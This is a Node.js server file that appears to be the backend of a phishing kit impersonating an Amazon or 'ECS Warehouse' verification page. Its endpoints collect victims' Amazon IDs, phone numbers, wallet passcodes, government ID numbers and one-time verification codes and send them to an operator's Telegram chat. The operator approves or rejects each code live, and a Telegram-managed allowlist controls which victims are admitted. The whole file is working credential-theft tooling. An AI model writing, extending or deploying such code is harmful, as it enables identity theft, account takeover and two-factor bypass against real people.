require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3001;
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Initialize the Telegram bot with polling enabled
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

app.use(cors());
app.use(express.json());

// Serve static files from the React app dist folder if it exists
app.use(express.static(path.join(__dirname, '../app/dist')));

// Map to store pending verification requests waiting for admin approval
const pendingRequests = new Map();

// --- Allowed IDs Management ---
const ALLOWED_IDS_FILE = path.join(__dirname, 'allowed_ids.json');

function getAllowedIds() {
  const ids = new Set();
  
  // 1. Load from Environment Variable (Persistent across restarts)
  if (process.env.INITIAL_ALLOWED_IDS) {
    process.env.INITIAL_ALLOWED_IDS.split(',').forEach(id => {
      if (id.trim()) ids.add(id.trim().toLowerCase());
    });
  }

  // 2. Load from local file (Temporary session IDs)
  if (fs.existsSync(ALLOWED_IDS_FILE)) {
    try {
      const fileIds = JSON.parse(fs.readFileSync(ALLOWED_IDS_FILE, 'utf-8'));
      fileIds.forEach(id => ids.add(id.toLowerCase()));
    } catch (e) {
      console.error('Error reading allowed_ids.json:', e);
    }
  }
  
  return Array.from(ids);
}

function saveAllowedIds(ids) {
  fs.writeFileSync(ALLOWED_IDS_FILE, JSON.stringify(ids, null, 2));
}

// Telegram Bot Commands
bot.onText(/\/allow (.+)/, (msg, match) => {
  if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
  
  // Support space or comma separated IDs
  const input = match[1].replace(/,/g, ' ');
  const idsToAdd = input.split(/\s+/).filter(id => id.trim()).map(id => id.trim().toLowerCase());
  
  const currentIds = getAllowedIds();
  const newlyAdded = [];

  idsToAdd.forEach(id => {
    if (!currentIds.includes(id)) {
      currentIds.push(id);
      newlyAdded.push(id);
    }
  });

  if (newlyAdded.length > 0) {
    saveAllowedIds(currentIds);
    bot.sendMessage(msg.chat.id, `✅ Added ${newlyAdded.length} ID(s) to the allowlist:\n${newlyAdded.join('\n')}`);
  } else {
    bot.sendMessage(msg.chat.id, `⚠️ These IDs are already allowed or list was empty.`);
  }
});

bot.onText(/\/remove (.+)/, (msg, match) => {
  if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
  const idToRemove = match[1].trim().toLowerCase();
  let ids = getAllowedIds();
  if (ids.includes(idToRemove)) {
    ids = ids.filter(id => id !== idToRemove);
    saveAllowedIds(ids);
    bot.sendMessage(msg.chat.id, `✅ Removed ${idToRemove} from the allowlist.`);
  } else {
    bot.sendMessage(msg.chat.id, `⚠️ ${idToRemove} was not in the allowlist.`);
  }
});

bot.onText(/\/list/, (msg) => {
  if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
  const ids = getAllowedIds();
  if (ids.length === 0) {
    bot.sendMessage(msg.chat.id, "The allowlist is currently empty. (No one can log in)");
  } else {
    bot.sendMessage(msg.chat.id, `📋 *Allowed IDs:*\n${ids.join('\n')}`, { parse_mode: 'Markdown' });
  }
});

// --- API Endpoints ---
app.post('/api/check-id', (req, res) => {
  const { amazonId } = req.body;
  if (!amazonId) return res.json({ allowed: false });
  const ids = getAllowedIds();
  const isAllowed = ids.includes(amazonId.toLowerCase().trim());
  res.json({ allowed: isAllowed });
});

app.post('/api/log-data', async (req, res) => {
  const data = req.body;
  const text = `<b>New ECS Warehouse User Data:</b>\nAmazon ID: ${data.amazonId}\nFirst Name: ${data.firstName}\nVerified Phone: ${data.phoneNumber}\nWallet Passcode: <b>${data.walletPasscode}</b>\nID Number: ${data.govId}\nTimestamp: ${data.timestamp}`;
  
  try {
    await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
    res.json({ success: true });
  } catch (error) {
    console.error('Failed to send to Telegram:', error);
    res.json({ success: false });
  }
});

app.post('/api/admin-alert', async (req, res) => {
  const data = req.body;
  const text = `🚨 <b>NEW ACCESS REQUEST</b>\nName: ${data.name}\nAmazon ID: ${data.amazonId}\nPhone: ${data.phone}\nID: ${data.id}`;
  
  try {
    await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
    res.json({ success: true });
  } catch (error) {
    res.json({ success: false });
  }
});

app.post('/api/submit-code', (req, res) => {
  const data = req.body;
  const requestId = data.amazonId || Date.now().toString(); 
  
  const text = `🔐 <b>Verification Code entered by ${data.firstName}:</b>\n<code>${data.code}</code>\n\nIs this valid?`;
  
  const opts = {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Approve', callback_data: `approve_${requestId}` },
          { text: '❌ Reject', callback_data: `reject_${requestId}` }
        ]
      ]
    }
  };

  bot.sendMessage(ADMIN_CHAT_ID, text, opts)
    .then(() => {
      pendingRequests.set(requestId, { res });
    })
    .catch((error) => {
      console.error('Error sending code to admin:', error);
      res.status(500).json({ approved: false, error: 'Telegram error' });
    });
});

bot.on('callback_query', (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID.toString()) return;

  if (data.startsWith('approve_') || data.startsWith('reject_')) {
    const isApproved = data.startsWith('approve_');
    const requestId = data.split('_')[1];

    const pending = pendingRequests.get(requestId);
    if (pending) {
      pending.res.json({ approved: isApproved });
      pendingRequests.delete(requestId);
      
      bot.editMessageText(
        query.message.text + `\n\n<b>Status:</b> ${isApproved ? '✅ Approved' : '❌ Rejected'}`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: 'HTML'
        }
      );
    } else {
      bot.answerCallbackQuery(query.id, { text: "Request not found or already answered.", show_alert: true });
    }
    bot.answerCallbackQuery(query.id);
  }
});

// Any other route falls back to index.html (for React Router)
app.use((req, res, next) => {
  res.sendFile(path.join(__dirname, '../app/dist/index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
